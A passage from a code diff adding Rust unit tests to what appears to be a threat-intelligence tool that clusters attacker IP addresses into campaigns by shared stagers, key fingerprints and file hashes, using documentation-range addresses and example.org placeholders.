+        name(&mut input, "key", "SHA256:k", &[G1[0], G1[1], G1[2]]);
+        let out = v2(&input);
+        assert_eq!(out.campaigns.len(), 1);
+        let c = &out.campaigns[0];
+        assert_eq!((c.size, c.hard_edges, c.joiner_edges), (3, 1, 3));
+    }
+
+    #[test]
+    fn v1_stays_a_clean_baseline() {
+        let mut input = two_groups();
+        name(&mut input, "stager", S, &[G1[0], G1[1], G2[0], G2[1]]);
+        name(&mut input, "file", "aa", &strs(&addresses(60)));
+        let out = compute(&input, &Params::V1);
+        assert_eq!(formed(&input, &out).len(), 2);
+        assert!(out.edges.iter().all(|e| !is_joiner(e.kind)));
+        assert!(out.excluded.is_empty());
+        assert_eq!(out.members.len(), 6);
+    }
+
+    #[tokio::test]
+    async fn addresses_only_a_joiner_names_do_not_move_path_scores() {
+        let (s, _d) = store().await;
+        feed(&s, order_fixture()).await;
+        let mut conn = s.pool.acquire().await.unwrap();
+        let mut input = Input::read(&mut conn).await.unwrap();
+        drop(conn);
+        let scores = |input: &Input| -> Vec<f64> {
+            let mut v: Vec<f64> = v2(input).scored.iter().map(|x| x.score).collect();
+            v.sort_by(f64::total_cmp);
+            v
+        };
+        let before = scores(&input);
+        name(&mut input, "stager", S, &strs(&addresses(40)));
+        assert_eq!(scores(&input), before);
+        assert_eq!(v2(&input).campaigns.last().unwrap().size, 40);
+    }
+
+    /// `ip` sighted naming `value`, in a source of its own.
+    pub(crate) async fn sighted(
+        s: &Store,
+        kind: &str,
+        role: &str,
+        value: &str,
+        ip: &str,
+        ts: &str,
+    ) {
+        let hash = crate::store::pieces::piece_hash(kind, value);
+        let ip_id = s.upsert_ip(ip.parse().unwrap()).await.unwrap().id;
+        sqlx::query(
+            "INSERT OR IGNORE INTO pieces (hash, kind, value, first_seen, last_seen, ips, sources)
+             VALUES (?, ?, ?, ?3, ?3, 1, 1)",
+        )
+        .bind(hash)
+        .bind(kind)
+        .bind(value)
+        .bind(ts)
+        .execute(&s.pool)
+        .await
+        .unwrap();
+        let next: i64 = sqlx::query_scalar(
+            "SELECT COALESCE(MAX(source_id), 0) + 1 FROM piece_sightings WHERE piece = ?",
+        )
+        .bind(hash)
+        .fetch_one(&s.pool)
+        .await
+        .unwrap();
+        sqlx::query("INSERT INTO piece_sightings VALUES (?, 'request', ?, ?, ?, 'claimed', ?)")
+            .bind(hash)
+            .bind(next)
+            .bind(ip_id)
+            .bind(role)
+            .bind(ts)
+            .execute(&s.pool)
+            .await
+            .unwrap();
+    }
+
+    #[tokio::test]
+    async fn input_reads_joiner_roles_with_each_addresses_span() {
+        let (s, _d) = store().await;
+        let ip = "192.0.2.1";
+        sighted(&s, "stager", "stager", S, ip, "2026-10-01 00:00:00").await;
+        sighted(&s, "stager", "stager", S, ip, "2026-10-02 00:00:00").await;
+        sighted(&s, "stager", "stager", S, ip, "2026-10-03 00:00:00").await;
+        sighted(
+            &s,
+            "stager",
+            "queried",
+            "q.example.org",
+            ip,
+            "2026-10-01 00:00:00",
+        )
+        .await;
+        sighted(
+            &s,
+            "stager",
+            "self-hosted",
+            "h.example.org",
+            ip,
+            "2026-10-01 00:00:00",
+        )
+        .await;
+        sighted(&s, "key", "key", "SHA256:k", ip, "2026-10-01 00:00:00").await;
+        sighted(&s, "file", "file", "aa", ip, "2026-10-01 00:00:00").await;
+        sighted(&s, "tag", "tag", "t", ip, "2026-10-01 00:00:00").await;
+        let id = ip_id(&s, ip).await;
+        let mut conn = s.pool.acquire().await.unwrap();
+        let input = Input::read(&mut conn).await.unwrap();
+        let mut got: Vec<_> = input
+            .joiners
+            .iter()
+            .map(|(k, v, i, t)| (*k, v.as_str(), *i, t.as_str()))
+            .collect();
+        got.sort();
+        assert_eq!(
+            got,
+            [
+                ("file", "aa", id, "2026-10-01 00:00:00"),
+                ("key", "SHA256:k", id, "2026-10-01 00:00:00"),
+                ("stager", S, id, "2026-10-01 00:00:00"),
+                ("stager", S, id, "2026-10-03 00:00:00"),
+            ]
+        );
+    }
+
+    #[tokio::test]
+    async fn a_pass_stores_joiner_edges_and_lists_unmerged_ones_on_both_sides() {
+        let (s, _d) = store().await;
+        feed(&s, group(H1, "hone")).await;
+        feed(&s, group(H2, "htwo")).await;
+        for ip in [H1[0], H1[1], H2[0]] {
+            sighted(&s, "stager", "stager", S, ip, "2026-10-01 00:00:00").await;
+        }
+        let r = s.recompute_campaigns(true).await.unwrap();
+        assert_eq!(r.edges["stager"], 2, "{r}");
+        for key in ["192.0.2.80", "192.0.2.83"] {
+            let c = s.campaign(key).await.unwrap().unwrap();
+            assert_eq!(c.row.v, 3);
+            let claimed: Vec<_> = c.edges.iter().filter(|e| is_joiner(&e.kind)).collect();
+            assert!(claimed.iter().any(|e| !e.merged), "{key}: {claimed:?}");
+        }
+        let a = s.campaign("192.0.2.80").await.unwrap().unwrap();
+        let b = s.campaign("192.0.2.83").await.unwrap().unwrap();
+        assert_eq!((a.row.joiner_edges, b.row.joiner_edges), (1, 0));
+        assert_eq!((a.row.hard_edges, b.row.hard_edges), (3, 3));
+    }
+
+    #[tokio::test]
+    async fn joiner_only_addresses_have_a_span() {
+        let (s, _d) = store().await;
+        for (ip, ts) in [
+            ("192.0.2.1", "2026-10-02 00:00:00"),
+            ("192.0.2.2", "2026-10-01 00:00:00"),
+        ] {
+            sighted(&s, "key", "key", "SHA256:k", ip, ts).await;
+        }
+        s.recompute_campaigns(true).await.unwrap();
+        let list = s.campaign_list().await.unwrap();
+        assert_eq!(list.len(), 1);
+        assert_eq!(list[0].key, "192.0.2.2", "the oldest member");
+        assert_eq!(list[0].first_seen, "2026-10-01 00:00:00");
+        assert_eq!(list[0].last_seen, "2026-10-02 00:00:00");
     }
 
     async fn evaluated(ops: Vec<Op>) -> String {
